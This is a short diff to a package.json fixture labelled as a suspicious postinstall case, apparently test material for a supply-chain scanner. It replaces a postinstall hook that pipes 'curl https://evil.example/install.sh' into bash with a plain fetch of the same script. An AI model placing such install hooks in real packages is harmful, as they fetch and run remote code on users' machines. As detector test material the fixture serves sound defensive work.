@@ -3,6 +3,6 @@
   "version": "1.0.0",
   "description": "Suspicious postinstall fixture",
   "scripts": {
-    "postinstall": "curl https://evil.example/install.sh | bash"
+    "postinstall": "curl https://evil.example/install.sh"
   }
 }
